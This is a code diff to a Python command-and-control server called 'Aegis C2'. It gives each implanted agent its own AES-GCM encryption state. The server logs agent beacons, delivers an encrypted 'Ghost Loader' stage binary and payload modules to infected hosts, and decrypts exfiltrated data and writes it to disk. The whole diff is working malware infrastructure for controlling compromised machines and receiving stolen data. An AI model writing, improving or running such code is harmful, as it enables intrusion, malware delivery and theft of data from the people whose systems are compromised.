@@ -18,7 +18,7 @@ from datetime import datetime
 
 # Import our config editor
 import config_editor
-from server_crypto import SERVER_CRYPTO, AEGIS_GCM_TAG_BYTES, AEGIS_GCM_IV_BYTES
+from server_crypto import AegisCrypto, SERVER_CRYPTO, AEGIS_GCM_TAG_BYTES, AEGIS_GCM_IV_BYTES
 
 # ── Resolve absolute path to project root ─────────────────────────────────
 # This ensures the server works regardless of which directory it's launched from.
@@ -31,7 +31,7 @@ STATE_FILE_PATH = os.path.join(SCRIPT_DIR, "c2_state.json")
 PID_FILE_PATH = os.path.join(SCRIPT_DIR, "c2_server.pid")
 
 # Global State (Daemon Mode)
-AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []}}
+AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": [], "crypto": {...}}}
 ACTIVE_AGENT = None
 SERVER_RUNNING = True
 HTTPD_INSTANCE = None # Keep track of the server instance to shut it down properly
@@ -263,87 +263,92 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         except BrokenPipeError:
             pass
 
+    def _get_agent_crypto(self, node_id_hex):
+        agent = AGENTS.get(node_id_hex)
+        if not agent:
+            return SERVER_CRYPTO
+
+        crypto_state = agent.get("crypto")
+        crypto = AegisCrypto()
+        if crypto_state:
+            crypto.from_dict(crypto_state)
+        return crypto
+
+    def _save_agent_crypto(self, node_id_hex, crypto):
+        if node_id_hex in AGENTS:
+            AGENTS[node_id_hex]["crypto"] = crypto.to_dict()
+
     def _handle_beacon(self, data):
-        """
-        Process a beacon from the stager/agent.
-        """
         client_ip = self.client_address[0]
         env, ct = parse_envelope(data)
 
-        if env:
-            node_id_hex = env["node_id_hex"]
-            seq = env["sequence"]
-            msg_type = env["msg_type"]
-
-            # Use first 8 hex chars for display
-            short_id = node_id_hex[:8]
-
-            if node_id_hex not in AGENTS:
-                AGENTS[node_id_hex] = {
-                    "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "ip": client_ip,
-                    "info": {},
-                    "tasks": [],
-                    "sequence": seq,
-                }
-                log_print(f"[+] New Agent: {short_id} from {client_ip} (seq={seq})", Colors.GREEN)
-            else:
-                log_print(f"[~] Beacon: {short_id} from {client_ip} (seq={seq})", Colors.CYAN)
-
-            agent = AGENTS[node_id_hex]
-            agent["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            agent["ip"] = client_ip
-            agent["sequence"] = seq
-
-            if agent["tasks"]:
-                tasks = agent["tasks"]
-                log_print(f"  └─ Sending {len(tasks)} task(s) to {short_id}", Colors.WARNING)
-                # In a real impl, we'd pack these. For now, we just clear them.
-                agent["tasks"] = []
-        else:
+        if not env:
             log_print(f"[?] Beacon from {client_ip} with unparseable envelope ({len(data)} bytes)", Colors.WARNING)
-            # Basic IP tracking fallback omitted for brevity in daemon mode
+            return b""
 
-        if env and ct:
-            # We must decrypt the beacon to mathematically progress the server's AES-GCM sequence!
-            # The client used the envelope WITH ZERO IV AND TAG as AAD.
+        node_id_hex = env["node_id_hex"]
+        seq = env["sequence"]
+        short_id = node_id_hex[:8]
+
+        if node_id_hex not in AGENTS:
+            AGENTS[node_id_hex] = {
+                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "ip": client_ip,
+                "info": {},
+                "tasks": [],
+                "sequence": seq,
+                "crypto": None
+            }
+            log_print(f"[+] New Agent: {short_id} from {client_ip} (seq={seq})", Colors.GREEN)
+        else:
+            log_print(f"[~] Beacon: {short_id} from {client_ip} (seq={seq})", Colors.CYAN)
+
+        agent = AGENTS[node_id_hex]
+        agent["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        agent["ip"] = client_ip
+        agent["sequence"] = seq
+
+        crypto = self._get_agent_crypto(node_id_hex)
+
+        if ct:
             aad_env = bytearray(data[:ENVELOPE_SIZE])
-
-            # offsets: iv is bytes 16 to 28, tag is bytes 28 to 44
-            aad_env[16:28] = b'\x00' * 12 # iv
-            aad_env[28:44] = b'\x00' * 16 # tag
+            aad_env[16:44] = b'\x00' * 28  # zero iv and tag
 
             try:
-                # Decrypting automatically increments SERVER_CRYPTO counters to match the client
-                decrypted_task = SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
-                log_print(f"  └─ Decrypted Beacon Payload ({len(decrypted_task)} bytes)", Colors.CYAN)
+                decrypted_fp = crypto.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+                log_print(f"  └─ Decrypted Beacon Payload ({len(decrypted_fp)} bytes)", Colors.CYAN)
             except Exception as e:
                 log_print(f"  └─ Failed to decrypt beacon: {e}", Colors.FAIL)
+                return b""
 
-        # The server also responds to beacons with an encrypted response if it has tasks!
-        # But we'll just send an empty encrypted task to keep the state machine perfectly aligned.
-        seq = SERVER_CRYPTO.total_messages
-        node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00'*16
+        if agent["tasks"]:
+            tasks = agent["tasks"]
+            log_print(f"  └─ Sending {len(tasks)} task(s) to {short_id}", Colors.WARNING)
+            agent["tasks"] = []
+
+        seq_resp = crypto.total_messages
+        node_id_bytes = bytes.fromhex(node_id_hex)
 
         aad_env_resp = struct.pack(
             ENVELOPE_FMT,
             C2_MAGIC,
             C2_MSG_TASK_RESP,
             0, # len of ciphertext
-            seq,
+            seq_resp,
             b'\x00'*12,
             b'\x00'*16,
             node_id_bytes
         )
 
-        ciphertext, iv, tag = SERVER_CRYPTO.encrypt(b"", aad_env_resp)
+        ciphertext, iv, tag = crypto.encrypt(b"", aad_env_resp)
+        self._save_agent_crypto(node_id_hex, crypto)
 
         env_bytes_resp = struct.pack(
             ENVELOPE_FMT,
             C2_MAGIC,
             C2_MSG_TASK_RESP,
             0,
-            seq,
+            seq_resp,
             iv,
             tag,
             node_id_bytes
@@ -352,19 +357,28 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         return env_bytes_resp + ciphertext
 
     def _handle_stage_req(self, data):
-        """
-        Handle a stage request — the stager is asking for the Ghost Loader binary.
-        """
         client_ip = self.client_address[0]
         env, ct = parse_envelope(data)
 
-        short_id = "unknown"
-        if env:
-            short_id = env["node_id_hex"][:8]
+        if not env:
+            return b""
+
+        node_id_hex = env["node_id_hex"]
+        short_id = node_id_hex[:8]
 
         log_print(f"[⬇] Stage request from {short_id} ({client_ip})", Colors.BLUE)
 
-        # Look for the ghost loader binary in known locations
+        crypto = self._get_agent_crypto(node_id_hex)
+
+        if ct:
+            aad_env = bytearray(data[:ENVELOPE_SIZE])
+            aad_env[16:44] = b'\x00' * 28  # zero iv and tag
+            try:
+                crypto.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+            except Exception as e:
+                log_print(f"  └─ Failed to decrypt stage request: {e}", Colors.FAIL)
+                return b""
+
         ghost_paths = [
             os.path.join(PROJECT_ROOT, "build", "aegis_ghost_loader"),
             os.path.join(PROJECT_ROOT, "payloads", "ghost_loader"),
@@ -377,27 +391,23 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                     ghost_data = f.read()
                 log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)
 
-                seq = SERVER_CRYPTO.total_messages
-                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00'*16
+                seq = crypto.total_messages
+                node_id_bytes = bytes.fromhex(node_id_hex)
 
-                # We must construct the AAD envelope *before* encryption.
-                # In the C client `aegis_encrypt` is called with the envelope as AAD,
-                # but the `iv` and `tag` fields within that envelope are 0 at the time of the call!
-                aad_env = struct.pack(
+                aad_env_resp = struct.pack(
                     ENVELOPE_FMT,
                     C2_MAGIC,
                     C2_MSG_STAGE_DATA,
-                    len(ghost_data), # length of ciphertext (same as plaintext for GCM)
+                    len(ghost_data),
                     seq,
-                    b'\x00'*12, # IV is zero during AAD
-                    b'\x00'*16, # Tag is zero during AAD
+                    b'\x00'*12,
+                    b'\x00'*16,
                     node_id_bytes
                 )
 
-                # Encrypt the stage for the client using the correct AAD!
-                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env)
+                ciphertext, iv, tag = crypto.encrypt(ghost_data, aad_env_resp)
+                self._save_agent_crypto(node_id_hex, crypto)
 
-                # Now pack the FINAL envelope with the actual IV and TAG to send over the wire
                 env_bytes = struct.pack(
                     ENVELOPE_FMT,
                     C2_MAGIC,
@@ -410,31 +420,33 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 )
 
                 log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
-                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                 return env_bytes + ciphertext
 
         log_print(f"  └─ Ghost loader not found in any known path!", Colors.FAIL)
-        log_print(f"     Searched: {', '.join(ghost_paths)}", Colors.FAIL)
         return b""
 
     def _handle_resource_req(self, resource_id, data):
-        """Serve a requested resource (ELF binary, payload, etc.) encrypted with proper envelope."""
         client_ip = self.client_address[0]
         env, ct = parse_envelope(data)
 
-        short_id = "unknown"
-        if env:
-            short_id = env["node_id_hex"][:8]
+        if not env:
+            return b""
 
-        # Decrypt the incoming request to keep crypto state in sync
-        if env and ct:
+        node_id_hex = env["node_id_hex"]
+        short_id = node_id_hex[:8]
+
+        log_print(f"[⬇] Serving resource request from {short_id} ({client_ip})", Colors.BLUE)
+
+        crypto = self._get_agent_crypto(node_id_hex)
+
+        if ct:
             aad_env = bytearray(data[:ENVELOPE_SIZE])
-            aad_env[16:28] = b'\x00' * 12  # zero IV for AAD
-            aad_env[28:44] = b'\x00' * 16  # zero tag for AAD
+            aad_env[16:44] = b'\x00' * 28  # zero iv and tag
             try:
-                SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+                crypto.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
             except Exception as e:
                 log_print(f"  └─ Failed to decrypt resource request: {e}", Colors.FAIL)
+                return b""
 
         payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
         path = os.path.join(payloads_dir, resource_id)
@@ -444,14 +456,13 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 resource_data = f.read()
             log_print(f"[⬇] Serving resource: {resource_id} ({len(resource_data)} bytes)", Colors.GREEN)
 
-            # Encrypt the resource data — mirrors _handle_stage_req pattern
-            seq = SERVER_CRYPTO.total_messages
-            node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00' * 16
+            seq = crypto.total_messages
+            node_id_bytes = bytes.fromhex(node_id_hex)
 
             aad_env_resp = struct.pack(
                 ENVELOPE_FMT,
                 C2_MAGIC,
-                C2_MSG_RESOURCE_REQ,  # response uses same msg type for AAD
+                C2_MSG_RESOURCE_REQ,
                 len(resource_data),
                 seq,
                 b'\x00' * 12,
@@ -459,7 +470,8 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
                 node_id_bytes
             )
 
-            ciphertext, iv, tag = SERVER_CRYPTO.encrypt(resource_data, aad_env_resp)
+            ciphertext, iv, tag = crypto.encrypt(resource_data, aad_env_resp)
+            self._save_agent_crypto(node_id_hex, crypto)
 
             env_bytes = struct.pack(
                 ENVELOPE_FMT,
@@ -479,43 +491,96 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         return b""
 
     def _handle_payload_req(self, data):
-        """Handle a payload module request from the Nanomachine."""
         client_ip = self.client_address[0]
         env, ct = parse_envelope(data)
 
-        short_id = "unknown"
-        if env:
-            short_id = env["node_id_hex"][:8]
+        if not env:
+            return b""
+
+        node_id_hex = env["node_id_hex"]
+        short_id = node_id_hex[:8]
 
         log_print(f"[⬇] Payload request from {short_id} ({client_ip})", Colors.BLUE)
 
-        # Check for a default payload in the payloads directory
+        crypto = self._get_agent_crypto(node_id_hex)
+
+        if ct:
+            aad_env = bytearray(data[:ENVELOPE_SIZE])
+            aad_env[16:44] = b'\x00' * 28  # zero iv and tag
+            try:
+                crypto.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+            except Exception as e:
+                log_print(f"  └─ Failed to decrypt payload request: {e}", Colors.FAIL)
+                return b""
+
         payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
         if os.path.exists(payloads_dir):
             payloads = os.listdir(payloads_dir)
             if payloads:
-                # Return the first available payload
                 ppath = os.path.join(payloads_dir, payloads[0])
                 with open(ppath, "rb") as f:
                     payload_data = f.read()
                 log_print(f"  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes)", Colors.GREEN)
-                return payload_data
+
+                seq = crypto.total_messages
+                node_id_bytes = bytes.fromhex(node_id_hex)
+
+                aad_env_resp = struct.pack(
+                    ENVELOPE_FMT,
+                    C2_MAGIC,
+                    C2_MSG_PAYLOAD_DATA,
+                    len(payload_data),
+                    seq,
+                    b'\x00' * 12,
+                    b'\x00' * 16,
+                    node_id_bytes
+                )
+
+                ciphertext, iv, tag = crypto.encrypt(payload_data, aad_env_resp)
+                self._save_agent_crypto(node_id_hex, crypto)
+
+                env_bytes = struct.pack(
+                    ENVELOPE_FMT,
+                    C2_MAGIC,
+                    C2_MSG_PAYLOAD_DATA,
+                    len(ciphertext),
+                    seq,
+                    iv,
+                    tag,
+                    node_id_bytes
+                )
+
+                log_print(f"  └─ Encrypted payload ({len(ciphertext)} bytes)", Colors.GREEN)
+                return env_bytes + ciphertext
 
         log_print(f"  └─ No payloads available", Colors.FAIL)
         return b""
 
     def _handle_exfil(self, data):
-        """Log exfiltrated data from the agent."""
         client_ip = self.client_address[0]
         env, ct = parse_envelope(data)
 
-        short_id = "unknown"
-        if env:
-            short_id = env["node_id_hex"][:8]
+        if not env:
+            return
+
+        node_id_hex = env["node_id_hex"]
+        short_id = node_id_hex[:8]
 
         log_print(f"[📤] Exfil received from {short_id} ({client_ip}): {len(data)} bytes", Colors.WARNING)
 
-        # Write to exfil directory for inspection
+        crypto = self._get_agent_crypto(node_id_hex)
+
+        if ct:
+            aad_env = bytearray(data[:ENVELOPE_SIZE])
+            aad_env[16:44] = b'\x00' * 28  # zero iv and tag
+            try:
+                decrypted_exfil = crypto.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
+                data = decrypted_exfil
+                self._save_agent_crypto(node_id_hex, crypto)
+            except Exception as e:
+                log_print(f"  └─ Failed to decrypt exfil: {e}", Colors.FAIL)
+                return
+
         exfil_dir = os.path.join(PROJECT_ROOT, "exfil")
         os.makedirs(exfil_dir, exist_ok=True)
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -523,8 +588,6 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         with open(exfil_path, "wb") as f:
             f.write(data)
         log_print(f"  └─ Saved to {exfil_path}", Colors.CYAN)
-
-
 def run_daemon_server(port=443):
     global HTTPD_INSTANCE
 
